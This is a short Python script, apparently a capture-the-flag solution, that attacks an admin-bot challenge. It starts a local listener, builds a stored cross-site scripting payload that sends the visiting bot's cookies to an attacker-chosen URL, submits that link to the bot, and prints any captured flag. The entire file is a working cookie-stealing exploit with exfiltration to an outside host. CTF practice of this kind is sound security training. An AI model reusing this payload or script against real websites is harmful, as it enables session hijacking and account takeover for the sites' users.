#!/usr/bin/env python3
import requests
import sys
from urllib.parse import quote
import http.server
import threading

flag_prefix = 'flag{'
bot_url = 'https://admin-bot.acmcyber.com/no-fetch'


class GetHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if flag_prefix in self.path:
            print("Flag found:", self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'thx for flag')
            exit(0)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'thx for visiting')


def start_server():
    server_address = ('localhost', 8000)
    httpd = http.server.HTTPServer(server_address, GetHandler)
    httpd.serve_forever()


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <local-url>")
        exit(-1)

    payload = "http://ao.bliu.tech:9090/post?content=" + \
        quote("<img src=x onerror=this.src='" +
              sys.argv[1] + "?c='+document.cookie>")

    print('Starting server...')
    thread = threading.Thread(target=start_server)
    thread.daemon = True
    thread.start()
    print('Server started.')

    print('Sending payload...', payload)
    r = requests.post(bot_url, data={'url': payload})

    while thread.is_alive():
        pass
